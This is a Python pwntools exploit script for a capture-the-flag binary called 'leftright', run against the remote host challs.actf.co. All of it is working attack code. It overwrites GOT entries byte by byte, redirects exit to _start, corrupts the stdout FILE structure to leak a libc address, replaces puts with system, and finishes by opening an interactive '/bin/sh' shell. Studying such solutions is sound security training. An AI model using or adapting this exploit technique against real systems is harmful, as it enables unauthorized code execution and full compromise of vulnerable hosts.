#!/usr/bin/env python3

from pwn import *
#from ctypes import c_uint16 

e = ELF("leftright_patched")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = e
#context.log_level = 'debug'

def conn():
    if args.LOCAL:
        r = process([e.path])
        #r = gdb.debug([e.path], 'b *main+195\nb *main+434\nc')
        if args.DEBUG:
            gdb.attach(r)
    else:
        #r = remote("addr", 1337)
        r = remote('challs.actf.co', 31324)

    return r


def main():
    r = conn()

    # good luck pwning :)
    r.recvuntil(b': ')
    r.sendline(b'foo')
    for _ in range(65536 - (e.sym['arr'] - e.got['setbuf'])):
        #print(_)
        if _%5000 == 0: 
            print(_)
            r.clean()
        r.sendline(b'1')
    # setbuf -> puts (1/16 guess)
    r.sendline(b'2')
    r.send(b'\xa0')
    r.sendline(b'1')
    r.sendline(b'2')
    r.send(b'\x35')
    # exit to _start 
    for _ in range(e.got['exit'] - (e.got['setbuf'] + 1)): r.sendline(b'1')
    r.sendline(b'2')
    r.send(b'\xc0')
    # stdout -> stdout+0x8 
    #for _ in range(e.sym['stdout'] - (e.got['exit'])): r.sendline(b'1')
    #r.sendline(b'2')
    #r.send(b'\x88')
    # exit 
    for _ in range((e.sym['arr'] - e.got['setbuf']) - (e.got['exit'] - (e.got['setbuf'] + 1)) - 1): r.sendline(b'1')
    r.sendline(b'0')
    r.sendline(p32(0xfbad1800)+p32(0)+p64(0)*3+b'\x00')
    leak=r.recvuntil(b'Name: ')
    libc_leak=u64(leak[-33:-33+8])
    print('libc_leak @', hex(libc_leak))
    libc.address = libc_leak - libc.sym['_IO_2_1_stdin_']
    print('libc @', hex(libc.address))
    r.sendline(b'/bin/sh')
    # puts -> system 
    for _ in range(65536 - (e.sym['arr'] - e.got['puts'])):
        #print(_)
        if _%5000 == 0: 
            print(_)
            r.clean()
        r.sendline(b'1')
    for b in p64(libc.sym['system']):
        r.sendline(b'2')
        r.sendline(bytes([b]))
        r.sendline(b'1')
    # exit 
    r.sendline(b'3')
    r.interactive()

if __name__ == "__main__":
    main()
